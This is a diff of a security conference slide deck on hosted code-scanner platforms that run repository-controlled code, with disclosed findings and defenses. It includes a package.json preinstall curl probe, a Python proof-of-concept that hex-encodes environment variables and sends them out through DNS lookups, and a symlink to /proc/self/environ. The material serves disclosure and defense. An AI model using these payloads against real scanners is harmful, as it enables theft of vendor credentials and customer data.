@@ -14,6 +14,8 @@ has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 90.4
 ocr_unreliable_blocks: 0
+vision_verified_pages_changed: 56
+vision_verified_pages: 56
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
 companion_files: []
@@ -35,43 +37,33 @@ Turning security vendors into supply-chain weapons
 
 Co-founder & CTO @ ZeroPath Raphael Karger
 
-1
-
 ## Slide 2
 
 ##### Whoami
 
 **Raphael Karger Co-founder & CTO @ ZeroPath** Prior life: Security Engineer @ Google
 
-2
-
 ## Slide 3
 
 ##### Agenda
 
 **1 Detection**
+The incident in our scanner and how the research started
 
-   - The incident in our scanner and how the research started
+**2 Why Scanners**
+Why hosted scanners are high-value targets
 
-- **2 Why Scanners**
+**3 Related Incidents**
+Vendor-to-customer incidents and the repository-to-vendor path
 
-   - Why hosted scanners are high-value targets
+**4 Mechanism**
+Execution and file-read primitives
 
-- **Related**
+**5 Findings**
+20 platforms and 5 confirmed boundary failures
 
-- **3 Incidents**
-
-   - Vendor-to-customer incidents and the repository-to-vendor path
-
-- **4 Mechanism** Execution and file-read primitives
-
-- **5 Findings**
-
-   - 20 platforms and 5 confirmed boundary failures
-
-- **6 Defenses** Vendor defenses and buyer questions
-
-3
+**6 Defenses**
+Vendor defenses and buyer questions
 
 ## Slide 4
 
@@ -91,13 +83,9 @@ Co-founder & CTO @ ZeroPath Raphael Karger
 
 •Focus: **untrusted repository processing** and **what the workers can access**
 
-4
-
 ## Slide 5
 
 # **Detection**
-
-5
 
 ## Slide 6
 
@@ -111,15 +99,13 @@ Co-founder & CTO @ ZeroPath Raphael Karger
 
 - We treated it as a real incident
 
-6
-
 ## Slide 7
 
 ##### What We Found
 
 What survived, and what did not
 
-**NO LONGER AVAILABLE**
+###### **NO LONGER AVAILABLE**
 
 - Full repository was no longer retained
 
@@ -131,17 +117,30 @@ What survived, and what did not
 
 - Scan metadata, DNS, and request telemetry remained available
 
-- package.json and packagelock.json were recovered
+- package.json and package-lock.json were recovered
 
 - Evidence was enough to reconstruct the test path
-
-7
 
 ## Slide 8
 
 ##### Scanner Probes
 
-###### The recovered files contained several independent probes, not one generic payload package.json
+The recovered files contained several independent probes, not one generic payload
+
+###### package.json
+
+```json
+{
+    "name": "test-repo-zeropath-ai-staging",
+    "version": "1.0.0",
+    "scripts": {
+        "preinstall": "curl http://npm_exec-bf23fc54.zeropath-ai-staging.d56f72pnmn0ff16jemkg3t9zjeurfme5x.[redacted]"
+    },
+    "dependencies": {
+        "malicious-url-dep": "git+http://npm_dep-71b5a574.zeropath-ai-staging.d56f72pnmn0ff16jemkg3t9zjeurfme5x.[redacted].git"
+    }
+}
+```
 
 ###### **WHAT IT TESTED**
 
@@ -153,6 +152,28 @@ What survived, and what did not
 
 ###### package-lock.json
 
+```json
+{
+    "name": "test-repo-zeropath-ai-staging",
+    "version": "1.0.0",
+    "lockfileVersion": 3,
+    "requires": true,
+    "packages": {
+        "": {
+            "name": "test-repo-zeropath-ai-staging",
+            "version": "1.0.0",
+            "dependencies": {
+                "malicious-url-dep": "git+http://npm_lock-4c1c6a80.zeropath-ai-staging.d56f72pnmn0ff16jemkg3t9zjeurfme5x.[redacted].git"
+            }
+        },
+        "node_modules/malicious-url-dep": {
+            "version": "1.0.0",
+            "resolved": "git+http://npm_lock-4c1c6a80.zeropath-ai-staging.d56f72pnmn0ff16jemkg3t9zjeurfme5x.[redacted].git#66373ba418058ba687b4bbba955477e12cc6fd57"
+        }
+    }
+}
+```
+
 ###### **WHAT IT TESTED**
 
 - Lockfile parsing
@@ -160,8 +181,6 @@ What survived, and what did not
 - Dependency resolution
 
 - Lockfile-specific processing
-
-8
 
 ## Slide 9
 
@@ -175,11 +194,9 @@ The only successful callback came from the secret-validation path
 
 - The attacker did not cross our worker boundary
 
-**OBSERVED HOSTNAME** honeytoken-a7095a5f. zeropath-ai-staging. d56f72pnmn0ff16jemkg3t9zjeurfme5x. [redacted]
+**OBSERVED HOSTNAME** honeytoken-a7095a5f.zeropath-ai-staging.d56f72pnmn0ff16jemkg3t9zjeurfme5x.[redacted]
 
 **PROVED  A backend validation path processed the supplied value** DID NOT PROVE  Execution, file access, or compromise of the worker
-
-9
 
 ## Slide 10
 
@@ -199,15 +216,16 @@ The only successful callback came from the secret-validation path
 
    - Other payloads were likely present in the repo that we did not capture
 
-10
-
 ## Slide 11
 
 ##### Probe Infrastructure
 
 Recovered npm_exec probe (no callback observed)
 
--bf23fc54 npm_exec .zeropath-ai-staging .d56f72….[OAST host] Probe Type Run ID Target Collector unique test run zeropath-ai-staging OAST correlation and Interactsh host npm script execution
+| npm_exec | -bf23fc54 | .zeropath-ai-staging | .d56f72….[OAST host] |
+|---|---|---|---|
+| Probe Type | Run ID | Target | Collector |
+| npm script execution | unique test run | zeropath-ai-staging | OAST correlation and Interactsh host |
 
 - Interactsh is a service for detecting out-of-band vulnerabilities
 
@@ -217,17 +235,17 @@ Recovered npm_exec probe (no callback observed)
 
 - The evidence matched an OAST collection service
 
-11
-
 ## Slide 12
 
-#### Why We Expanded the Research **It started as** protecting our own platform
+##### Why We Expanded the Research
+
+**It started as** protecting our own platform
 
 • Build Canaries became an internal regression framework
 
-• The same tests were run against selected hosted scanners • Confirmed issues became minimal reproductions and retests
+• The same tests were run against selected hosted scanners
 
-12
+• Confirmed issues became minimal reproductions and retests
 
 ## Slide 13
 
@@ -235,59 +253,33 @@ Recovered npm_exec probe (no callback observed)
 
 - Local, deliberately vulnerable scanner
 
-• Exploiting Terragrunt RCE through repository-defined hooks
+   - Exploiting Terragrunt RCE through repository-defined hooks
 
-• Synthetic credentials only
+- Synthetic credentials only
 
 Shows repository submission → backend execution → readable worker data
-
-13
 
 ## Slide 14
 
 ##### Demo
 
-14
-
-
-> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-:~$ nc -vlp 13377
-listening on [any] 13377 ...
-Tilix: r@debian: ~
-E Y OPERATIONS WORKSPACE
-Assessments, findings, policy decisions, and evidence
-ASSESSMENT TEMPLATES
-Policy pack review
-Infrastructure wrapper review
-EPOSITORY INTAKE
-BLIC GIT URL (HTT
-Browse. No file selected.
-Standard review
-LATEST RESULT
-STANDARD
-```
-
 ## Slide 15
 
 # **Why Scanners**
 
-15
-
 ## Slide 16
 
-###### The Assumption: Scanning Is Read-Only
+##### The Assumption: Scanning Is Read-Only
 
 ###### **ASSUMPTION**
+
+Scanning is often treated as read-only processing of untrusted code
 
 ###### **REALITY**
 
 Scanners may invoke package managers, build tools, metadata commands, plugins, or executable configuration
 
-Scanning is often treated as readmanagers, build tools, metadata only processing of untrusted code commands, plugins, or executable configuration Even without code execution, unsafe path handling can read outside the repository
-
-16
+Even without code execution, unsafe path handling can read outside the repository
 
 ## Slide 17
 
@@ -303,13 +295,11 @@ Scanning is often treated as readmanagers, build tools, metadata only processing
 
 ###### **SCANNER PLATFORM**
 
-   - Hosted backend that
+Hosted backend that processes repositories and uses customer-scoped integrations
 
-   - processes repositories and uses customerscoped integrations
+###### **WORKER BOUNDARY**
 
-- **WORKER BOUNDARY** Can repository-controlled
-
-- processing reach platform authority?
+Can repository-controlled processing reach platform authority?
 
 ###### **PLATFORM AUTHORITY AROUND THE WORKER**
 
@@ -319,35 +309,31 @@ Scanning is often treated as readmanagers, build tools, metadata only processing
 
 - Findings, secrets, internal services, and operational context
 
-17
-
 ## Slide 18
 
-Why Worker Exposure Matters The impact depends on what the worker can reach:
+##### Why Worker Exposure Matters
 
-**DATA**
+The impact depends on what the worker can reach:
 
-###### **AUTHORITY**
+###### **DATA**
 
 - Customer source code
 
 - Unpatched findings and secret findings
 
-   - Source-control and registry credentials
-
-   - Cloud or workload identity
-
 - Repository inventory and scan history
 
-- Status, check, pull-request, or remediation paths
+###### **AUTHORITY**
 
-18
+- Source-control and registry credentials
+
+- Cloud or workload identity
+
+- Status, check, pull-request, or remediation paths
 
 ## Slide 19
 
 # **Related Incidents**
-
-19
 
 ## Slide 20
 
@@ -355,15 +341,18 @@ Why Worker Exposure Matters The impact depends on what the worker can reach:
 
 The familiar direction: compromise trusted tooling, then follow its distribution path downstream
 
-**Trivy** Malicious releases and GitHub Actions were published
+**Trivy**
+Malicious releases and GitHub Actions were published
 
-**Checkmarx Customer-Facing Artifacts** Unauthorized GitHub Malicious code was published to → → repository access was VS Code extensions, GitHub reported after the Trivy Actions workflows, and a Jenkins compromise plugin
+→ **Checkmarx**
+Unauthorized GitHub repository access was reported after the Trivy compromise
+
+→ **Customer-Facing Artifacts**
+Malicious code was published to VS Code extensions, GitHub Actions workflows, and a Jenkins plugin
 
 This is the classic vendor-to-customer path: trusted security tooling becomes the delivery channel
 
 Public incident: Aqua Security and Checkmarx reports, 2026
-
-20
 
 ## Slide 21
 
@@ -372,30 +361,31 @@ Public incident: Aqua Security and Checkmarx reports, 2026
 This research tests the reverse path: content the vendor did not write reaches its backend
 
 **HOSTILE CODE**
-
-**SCANNER WORKER** Vendor processes the → content before a result is returned
-
 Attacker controls repository files, configuration, paths, or a published package
 
-**PLATFORM AUTHORITY** Worker may expose credentials, → internal services, or write paths
+→ **SCANNER WORKER**
+Vendor processes the content before a result is returned
+
+→ **PLATFORM AUTHORITY**
+Worker may expose credentials, internal services, or write paths
 
 ###### **Same trust concentration, opposite direction**
 
-Public incident: Kudelski Security, CodeRabbit PR → production RCE → GitHub App write access, 2025 Public incident: Anthropic, malicious PyPI package → scanner install → credential theft, 2026
+Public incident: Kudelski Security, CodeRabbit PR → production RCE → GitHub App write access, 2025
 
-21
+Public incident: Anthropic, malicious PyPI package → scanner install → credential theft, 2026
 
 ## Slide 22
 
 # **Mechanism**
 
-22
-
 ## Slide 23
 
 ##### Prior Work
 
-• OWASP CICD-SEC-4: Poisoned Pipeline Execution • MITRE ATT&CK T1677: Poisoned Pipeline Execution
+- OWASP CICD-SEC-4: Poisoned Pipeline Execution
+
+- MITRE ATT&CK T1677: Poisoned Pipeline Execution
 
 - Living off the Pipeline (LOTP)
 
@@ -403,31 +393,17 @@ Public incident: Kudelski Security, CodeRabbit PR → production RCE → GitHub 
 
 **Contribution:** not a new primitive. A systematic sweep of an untested product category, and tooling to automate the creation and testing of payloads.
 
-23
-
 ## Slide 24
 
 ##### Repository Processing Surfaces
 
-###### **PACKAGE AND BUILD METADATA**
-
-**PLUGINS & EXECUTABLE CONFIGURATION**
-
-setup.py metadata commands, gemspec evaluation, and lifecycle scripts external checks, custom rules, and repository-controlled configuration
-
-###### **LANGUAGE & BUILD TOOLING**
-
-repository-controlled build, editor, or language-server configuration
-
-**DEPENDENCY FETCHING**
-
-manifests, lockfiles, registry URLs, and submodules
-
-**PATH HANDLING**
-
-symlinks, archives, absolute paths, traversal, and special files
-
-24
+| | |
+|---|---|
+| **PACKAGE AND BUILD METADATA** | setup.py metadata commands, gemspec evaluation, and lifecycle scripts |
+| **PLUGINS & EXECUTABLE CONFIGURATION** | external checks, custom rules, and repository-controlled configuration |
+| **LANGUAGE & BUILD TOOLING** | repository-controlled build, editor, or language-server configuration |
+| **DEPENDENCY FETCHING** | manifests, lockfiles, registry URLs, and submodules |
+| **PATH HANDLING** | symlinks, archives, absolute paths, traversal, and special files |
 
 ## Slide 25
 
@@ -437,11 +413,9 @@ symlinks, archives, absolute paths, traversal, and special files
 
 - Scanner reads a repository-controlled path
 
-• Symlinks, archive paths, or unsafe handling can escape the repository
+- Symlinks, archive paths, or unsafe handling can escape the repository
 
 - Worker-local credentials or service configuration can be exposed
-
-25
 
 ## Slide 26
 
@@ -453,13 +427,13 @@ symlinks, archives, absolute paths, traversal, and special files
 
 **Review candidates:** missing coverage can generate candidate code, but human review is required before it enters the deterministic Python/Jinja corpus
 
-**Render:** accepted generators produce a fresh repository artifact with a payload ID and unique run ID **Validate:** mount the artifact in Docker, run the declared target tool, and pass only on the matching callback; hosted-vendor testing remains separate
+**Render:** accepted generators produce a fresh repository artifact with a payload ID and unique run ID
 
-26
+**Validate:** mount the artifact in Docker, run the declared target tool, and pass only on the matching callback; hosted-vendor testing remains separate
 
 ## Slide 27
 
-###### Local Validation Uses the Real Target Tool
+##### Local Validation Uses the Real Target Tool
 
 **Example: npm-preinstall**
 
@@ -475,47 +449,47 @@ symlinks, archives, absolute paths, traversal, and special files
 
 - Do not count stdout, exit code, or an unrelated request as proof
 
-27
-
 ## Slide 28
 
 ##### Testing Workflow
 
-Start from vendor documentation
+###### Start from vendor documentation
 
 - Capture explicit tool references and strongly implied processing surfaces
 
-- • Keep only surfaces with realistic RCE or blind SSRF potential • Reuse an existing payload, or create and validate one locally • Add validated generators to the payload library
+- Keep only surfaces with realistic RCE or blind SSRF potential
 
-- Probe the hosted scanner
+- Reuse an existing payload, or create and validate one locally
 
-   - Generate a probe-mode repository with unique payload and run IDs
+- Add validated generators to the payload library
 
-   - • Record which backend paths fire
+###### Probe the hosted scanner
 
-   - For RCE paths, confirm with a tailored bounded payload
+- Generate a probe-mode repository with unique payload and run IDs
 
-   - • For blind SSRF paths, validate only minimal known-service interactions
+- Record which backend paths fire
 
-28
+- For RCE paths, confirm with a tailored bounded payload
+
+- For blind SSRF paths, validate only minimal known-service interactions
 
 ## Slide 29
 
 ##### Example: Checkov External Checks
 
-Documentation signal: product supports Checkov external checks or custom policies
+**Documentation signal:** product supports Checkov external checks or custom policies
 
-Inference: Checkov may load repository-provided Python modules Build Canaries action: generate a minimal external-check payload when corpus coverage is missing
+**Inference:** Checkov may load repository-provided Python modules
 
-Docker validation: run the payload against Checkov to confirm the behavior before adding it to the corpus Product test: submit the probe, then use path-specific validation if the path fires
+**Build Canaries action:** generate a minimal external-check payload when corpus coverage is missing
 
-29
+**Docker validation:** run the payload against Checkov to confirm the behavior before adding it to the corpus
+
+**Product test:** submit the probe, then use path-specific validation if the path fires
 
 ## Slide 30
 
 # **Findings**
-
-30
 
 ## Slide 31
 
@@ -523,25 +497,23 @@ Docker validation: run the payload against Checkov to confirm the behavior befor
 
 - 20 self-service hosted scanners were selected for this research (excluding ZeroPath)
 
-• Requiring open signup was the main constraint on the candidate pool • Comparable workflow: hosted code-security or software supply-chain product processing a submitted repository
+   - Requiring open signup was the main constraint on the candidate pool
+
+- Comparable workflow: hosted code-security or software supply-chain product processing a submitted repository
 
 - Interpretation: this was a selected sample, not a random market survey or prevalence estimate
-
-31
 
 ## Slide 32
 
 ##### Conduct
 
-• Reachable path: self-service or public access to the tested functionality, with public evidence of real use
+- Reachable path: self-service or public access to the tested functionality, with public evidence of real use
 
 - Access limits: no false identities, sales-assisted access, customer impersonation, or social engineering
 
 - Testing stopped immediately when requested
 
 - No lateral movement, persistence, or access to customer data
-
-32
 
 ## Slide 33
 
@@ -559,8 +531,6 @@ Docker validation: run the payload against Checkov to confirm the behavior befor
 
 - Anonymized uniformly; selective disclosure should not become marketing material
 
-33
-
 ## Slide 34
 
 ##### How We Validated Worker Impact
@@ -571,21 +541,17 @@ Docker validation: run the payload against Checkov to confirm the behavior befor
 
 - Testing stopped after reproducible evidence; customer data was not accessed
 
-34
-
 ## Slide 35
 
 ##### What Counted as a Finding
 
 **1. Path Signal:** a callback, request, tool output, or behavior change only showed that a backend path reacted
 
-**2. Boundary Primitive:** we separately established repository-controlled execution or an out-ofroot file read
+**2. Boundary Primitive:** we separately established repository-controlled execution or an out-of-root file read
 
 **3. Worker Impact:** we also observed sensitive vendor-local material or privileged internal reach from the worker context
 
 **Counted:** both the primitive and meaningful worker impact were required; a callback alone was never enough
-
-35
 
 ## Slide 36
 
@@ -599,53 +565,29 @@ Docker validation: run the payload against Checkov to confirm the behavior befor
 
 **Black-box caveat: a non-trigger could reflect a payload mismatch, required modification, proprietary processing, blocked egress, or real protections**
 
-36
-
 ## Slide 37
 
 ##### Results
 
-self-service hosted scanner → **20** platforms tested
+**20** self-service hosted scanner platforms tested → **5** confirmed boundary failures
 
-**confirmed boundary 5 failures**
+**4** cases with backend execution
 
-**4 1 3** cases with backend case with an out-of-root file partial signals execution read
+**1** case with an out-of-root file read
 
-37
+**3** partial signals
 
 ## Slide 38
 
 ##### Confirmed Cases
 
-**Vendor**
-
-**Attack Vector**
-
-**What Was Exposed**
-
-**Vendor A**
-
-**Vendor B**
-
-Checkov config RCE
-
-Checkov config RCE
-
-Cloud credentials; internal service secrets Cloud credentials; production database credentials and services; internal service secrets
-
-**Vendor C** Ruby gemspec eval
-
-Cloud token; orchestration service-account token; RSA private key (SIGNING_KEY)
-
-**Vendor D** Python setup.py exec
-
-Cloud IAM credentials; GitHub PAT; Docker Hub PAT
-
-**Vendor E** Symlink traversal
-
-Payment processor key
-
-38
+| Vendor | Attack Vector | What Was Exposed |
+|---|---|---|
+| **Vendor A** | Checkov config RCE | Cloud credentials; internal service secrets |
+| **Vendor B** | Checkov config RCE | Cloud credentials; production database credentials and services; internal service secrets |
+| **Vendor C** | Ruby gemspec eval | Cloud token; orchestration service-account token; RSA private key (SIGNING_KEY) |
+| **Vendor D** | Python setup.py exec | Cloud IAM credentials; GitHub PAT; Docker Hub PAT |
+| **Vendor E** | Symlink traversal | Payment processor key |
 
 ## Slide 39
 
@@ -661,7 +603,20 @@ Observed command: python3.9 -Wi setup.py --name --version
 
 ###### **Selected PoC lines**
 
-39
+```python
+try:
+    urllib.request.urlopen(f'https://import.{d}', timeout=5)
+except:
+    pass
+try:
+    env_data = "\n".join(f"{k}={v}" for k, v in os.environ.items())
+    hex_data = env_data.encode().hex()
+    chunks = [hex_data[i:i+50] for i in range(0, len(hex_data), 50)]
+    for i, chunk in enumerate(chunks):
+        urllib.request.urlopen(f'https://env-{i}.{chunk}.{d}', timeout=2)
+except:
+    pass
+```
 
 ## Slide 40
 
@@ -677,21 +632,15 @@ The payload called urlopen(); the collector saw hostname lookups but no usable H
 
 **<chunk number>.<50 hex characters>.<vendor>.<oast domain>**
 
-40
-
 ## Slide 41
 
 ##### Vendor D: Vendor-Owned Credentials in the Worker
 
-• Cloud IAM credentials were present in the worker; exact permissions
+- Cloud IAM credentials were present in the worker; exact permissions were not enumerated
 
-were not enumerated
+- GitHub personal access token was present in the same worker
 
-• GitHub personal access token was present in the same worker
-
-• Docker Hub personal access token was present in the same worker
-
-41
+- Docker Hub personal access token was present in the same worker
 
 ## Slide 42
 
@@ -699,25 +648,23 @@ were not enumerated
 
 **repo/secrets.txt  →  /proc/self/environ  →  payment processor key in the UI**
 
-- Repository input: a symlink named secrets.txt pointed to /proc/self/environ
+- **Repository input:** a symlink named secrets.txt pointed to /proc/self/environ
 
-- Scanner behavior: the detector followed the link and scanned its own worker environment as file content
+- **Scanner behavior:** the detector followed the link and scanned its own worker environment as file content
 
-- Observed result: a payment processor key matched normal secret rules and appeared in the findings UI
+- **Observed result:** a payment processor key matched normal secret rules and appeared in the findings UI
 
 - This counted because repository-controlled file selection caused an out-of-root read of vendor-local data
 
-42
-
 ## Slide 43
 
-###### Vendor B: Production Database Credentials
+##### Vendor B: Production Database Credentials
 
-- Source: DATABASE_URL came from Vendor B's worker environment after repository-controlled execution
+- **Source:** DATABASE_URL came from Vendor B's worker environment after repository-controlled execution
 
-   - Complete material: the value included scheme, production hostname, database name, username, and password
+   - **Complete material:** the value included scheme, production hostname, database name, username, and password
 
-- Vendor confirmation: the database was live and enabled access to:
+- **Vendor confirmation:** the database was live and enabled access to:
 
    - GitHub OAuth grants (carrying the read and write permissions of the public app)
 
@@ -729,11 +676,9 @@ were not enumerated
 
    - Customer information
 
-43
-
 ## Slide 44
 
-###### What the Exposed Credentials Could Enable
+##### What the Exposed Credentials Could Enable
 
 - **Vendor-confirmed**
 
@@ -745,11 +690,9 @@ were not enumerated
 
    - Two cloud IAM credentials in separate environments; confirmed access within their policy
 
-44
-
 ## Slide 45
 
-###### What the Exposed Credentials Could Enable
+##### What the Exposed Credentials Could Enable
 
 - **Exposed, scope not enumerated**
 
@@ -759,27 +702,21 @@ were not enumerated
 
    - Other cloud IAM credentials; present across the affected environments, permissions not enumerated
 
-45
-
 ## Slide 46
 
-###### Patterns Across the Confirmed Cases
+##### Patterns Across the Confirmed Cases
 
-- Executable surfaces: setup.py, gemspec evaluation, and Checkov custom checks ran as code during repository processing
+- **Executable surfaces:** setup.py, gemspec evaluation, and Checkov custom checks ran as code during repository processing
 
-- Auxiliary helpers: at Vendor D the SBOM collector triggered while the main SCA path did not
+- **Auxiliary helpers:** at Vendor D the SBOM collector triggered while the main SCA path did not
 
-- Worker-local material: the confirmed cases exposed vendor-owned credentials
+- **Worker-local material:** the confirmed cases exposed vendor-owned credentials
 
-- Path escape: Vendor E's symlink reached /proc/self/environ with no code execution
-
-46
+- **Path escape:** Vendor E's symlink reached /proc/self/environ with no code execution
 
 ## Slide 47
 
 # **Defenses**
-
-47
 
 ## Slide 48
 
@@ -787,47 +724,31 @@ were not enumerated
 
 The same five boundaries, scored against what we actually observed
 
-**BOUNDARY WHAT WE OBSERVED**
-
-**EXECUTION**
-
-**FILE ACCESS**
-
-4 of 5: Checkov config at A and B, gemspec at C, setup.py at D 1 of 5: symlink to /proc/self/environ at E
-
-**NETWORK**
-
-**CREDENTIALS LIFETIME & STATE**
-
-Partial where present: DNS out and HTTP blocked at D; proxy routing left one case ambiguous 5 of 5: operational vendor credentials reachable from the analyzer Not testable from outside: no external signal distinguishes a fresh worker from a reused one
+| BOUNDARY | WHAT WE OBSERVED |
+|---|---|
+| **EXECUTION** | 4 of 5: Checkov config at A and B, gemspec at C, setup.py at D |
+| **FILE ACCESS** | 1 of 5: symlink to /proc/self/environ at E |
+| **NETWORK** | Partial where present: DNS out and HTTP blocked at D; proxy routing left one case ambiguous |
+| **CREDENTIALS** | 5 of 5: operational vendor credentials reachable from the analyzer |
+| **LIFETIME & STATE** | Not testable from outside: no external signal distinguishes a fresh worker from a reused one |
 
 Four boundaries we could measure from outside; the fifth is why buyers have to ask
-
-48
 
 ## Slide 49
 
 ##### What to Enforce
 
-Assume the analyzer can run attacker-controlled behavior; constrain what it can execute, read, reach, and retain **BOUNDARY WHAT SHOULD HAVE BEEN ENFORCED**
+Assume the analyzer can run attacker-controlled behavior; constrain what it can execute, read, reach, and retain
 
-**EXECUTION**
-
-Static metadata first; scripts, plugins, and custom rules off by default
-
-**FILE ACCESS**
-
-The repository snapshot is the only readable tree; no symlink, archive, or absolute-path escape
-
-**NETWORK**
-
-Default-deny egress; broker dependency fetches; block metadata, private ranges, internal DNS, and proxies
-
-**CREDENTIALS** No SCM, cloud, registry, database, or publishing tokens in analyzer env, files, or workload identity Fresh sandbox per scan; no writable shared caches; scratch destroyed after the result **LIFETIME & STATE**
+| BOUNDARY | WHAT SHOULD HAVE BEEN ENFORCED |
+|---|---|
+| **EXECUTION** | Static metadata first; scripts, plugins, and custom rules off by default |
+| **FILE ACCESS** | The repository snapshot is the only readable tree; no symlink, archive, or absolute-path escape |
+| **NETWORK** | Default-deny egress; broker dependency fetches; block metadata, private ranges, internal DNS, and proxies |
+| **CREDENTIALS** | No SCM, cloud, registry, database, or publishing tokens in analyzer env, files, or workload identity |
+| **LIFETIME & STATE** | Fresh sandbox per scan; no writable shared caches; scratch destroyed after the result |
 
 The goal is not “containerized”; it is a worker that has nothing durable or privileged to lose
-
-49
 
 ## Slide 50
 
@@ -835,23 +756,15 @@ The goal is not “containerized”; it is a worker that has nothing durable or 
 
 What to reach for at each boundary
 
-###### **BOUNDARY CONCRETE LEVERS**
-
-**EXECUTION**
-
-no-script tool modes, command allowlists, non-root runner, seccomp, AppArmor
-
-**FILE ACCESS**
-
-**NETWORK**
-
-read-only bind mounts, mount namespace / chroot, openat2, Landlock, AppArmor, safe extractors dependency broker / cache, egress proxy, DNS allowlist, NetworkPolicy / Cilium, nftables
-
-**CREDENTIALS** source fetcher / result publisher split, short-lived scoped tokens, held outside the worker **LIFETIME &** microVM / gVisor / Kata, tmpfs scratch, read-only content-addressed cache, teardown checks **STATE**
+| BOUNDARY | CONCRETE LEVERS |
+|---|---|
+| **EXECUTION** | no-script tool modes, command allowlists, non-root runner, seccomp, AppArmor |
+| **FILE ACCESS** | read-only bind mounts, mount namespace / chroot, openat2, Landlock, AppArmor, safe extractors |
+| **NETWORK** | dependency broker / cache, egress proxy, DNS allowlist, NetworkPolicy / Cilium, nftables |
+| **CREDENTIALS** | source fetcher / result publisher split, short-lived scoped tokens, held outside the worker |
+| **LIFETIME & STATE** | microVM / gVisor / Kata, tmpfs scratch, read-only content-addressed cache, teardown checks |
 
 Full matrix with every primitive: behind the QR code
-
-50
 
 ## Slide 51
 
@@ -862,31 +775,47 @@ One worker owns the scan end to end. Tool code only ever runs in containers that
 ###### **PLATFORM**
 
 multi-tenant · durable
-job queue
-ingestion API
-findings DB
 
-**Binds tenant + job** server-side **Re-validates** every submitted result **Workers never** write the DB directly
+- job queue
+- ingestion API
+- findings DB
+
+**Binds tenant + job** server-side
+**Re-validates** every submitted result
+**Workers never** write the DB directly
+
+lease job → · ← submit results
 
 ###### **SCAN WORKER**
 
-- lease job one per job · owns the scan end to end · disposable **1** Leases the job from the platform **2** Clones at the pinned commit, stages a read-only snapshot **3** Spawns a container per tool and feeds it the snapshot **4** Collects output as untrusted data, normalizes it **5** Submits results, then reaps every container
+one per job · owns the scan end to end · disposable
 
-- submit results **Runs no tool code** in its own process **SCM token dropped** before any container starts
+1. Leases the job from the platform
+2. Clones at the pinned commit, stages a read-only snapshot
+3. Spawns a container per tool and feeds it the snapshot
+4. Collects output as untrusted data, normalizes it
+5. Submits results, then reaps every container
 
-lease job
+**Runs no tool code** in its own process
+**SCM token dropped** before any container starts
 
-snapshot (read-only) + args findings · hostile input
-UNTRUSTED · one ephemeral container per tool, spawned and reaped by the worker
-container container container
-tool 1 tool 2 tool 3
-no credentials · no workload identity · no egress · ro /repo · tmpfs · destroyed after result
-
-clone @ pinned commit
+clone @ pinned commit →
 
 ###### **CUSTOMER SCM**
 
-external system **SCM-READ** short-lived, repo-scoped
+external system
+
+**SCM-READ** short-lived, repo-scoped
+
+↓ snapshot (read-only) + args · ↑ findings · hostile input
+
+###### UNTRUSTED · one ephemeral container per tool, spawned and reaped by the worker
+
+- container tool 1
+- container tool 2
+- container tool 3
+
+no credentials · no workload identity · no egress · ro /repo · tmpfs · destroyed after result
 
 ###### **DEPENDENCY BROKER**
 
@@ -894,25 +823,23 @@ the only egress a container gets: allowlisted package fetches
 
 The worker owns the job. The containers own nothing. Credentials never share a process with tool code.
 
-51
-
 ## Slide 52
 
 ##### What Buyers Should Ask
 
 Ask for concrete repository lifecycle and worker-boundary details
 
-- Repository lifecycle: What happens from connection or upload through the final result?
+- **Repository lifecycle:** What happens from connection or upload through the final result?
 
-- Execution boundary: Which stages or components are shared and which are dedicated?
+- **Execution boundary:** Which stages or components are shared and which are dedicated?
 
-- Repository-controlled behavior: Which features or integrations can change how a scan runs?
+- **Repository-controlled behavior:** Which features or integrations can change how a scan runs?
 
-- Adversarial testing: How are scanner changes tested against malformed or hostile repositories?
+- **Adversarial testing:** How are scanner changes tested against malformed or hostile repositories?
 
-   - Run Build Canaries against your own vendors and see whether you get callbacks Strong answers describe actual stages, credentials, worker lifetime, and recent design changes
+   - Run Build Canaries against your own vendors and see whether you get callbacks
 
-52
+Strong answers describe actual stages, credentials, worker lifetime, and recent design changes
 
 ## Slide 53
 
@@ -920,15 +847,9 @@ Ask for concrete repository lifecycle and worker-boundary details
 
 ###### **BUILD CANARIES**
 
-###### **DVASP**
-
 Generator framework + regression corpus
 
-Damn Vulnerable Application Security Platform
-
 <u>github.com/rek7/build-canaries</u>
-
-<u>github.com/rek7/dvasp</u>
 
 - Test scanner processing paths
 
@@ -936,13 +857,17 @@ Damn Vulnerable Application Security Platform
 
 - Use deterministic generators and product-specific probes
 
+###### **DVASP**
+
+Damn Vulnerable Application Security Platform
+
+<u>github.com/rek7/dvasp</u>
+
 - Deliberately vulnerable local scanner
 
 - Synthetic credentials and controlled failures
 
 - Practice detection and containment safely
-
-53
 
 ## Slide 54
 
@@ -950,7 +875,7 @@ Damn Vulnerable Application Security Platform
 
 ###### **Slides, Contact and Tools**
 
-bh2026_qr_v2.png
+<u>raphael.karger.is/bh-2026</u>
 
 Takeaways:
 
@@ -960,56 +885,11 @@ Takeaways:
 
 - Don't accept “it's containerized”
 
-<u>raphael.karger.is/bh-2026</u>
-
-54
-
 ## Slide 55
 
 ## Appendix
 
-55
-
 ## Slide 56
 
-Full Demo
+##### Full Demo
 
-56
-
-
-> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-Full Demo
-Mozilla Firefox Ml Tilix: r@debian: ~/ouild.
-debian: ~/build-canaries v 2700.1
-(.venv) $ nc -vlp 13377
-listening on [any] 13377
-] Assessments, findings, policy decisions, and evidence
-ECURITY OPERATIONS WORKSPAC
-Dashboard
-APPLICATION SECURITY OPERATIONS
-AppSec Posture Dashboard
-Findings
-Assessments
-Activity
-Documentation
-$ sudo docker run --rm -it projectdiscovery/interactsh-client: latest EVIDEN
-rver oast.live -v -duc 1
-RECENT FINDINGS v WORKSPACE SCOPE
-projectdiscovery.io
-Infrastr
-] Listing 1 payload for 00B Testing ucture
-S| £07! 745) v
-0 r
-review
-genera
-teda
-finding
-EVENTS
-Infrastr
-ucture
-wrappe
-56
-black hat
-```
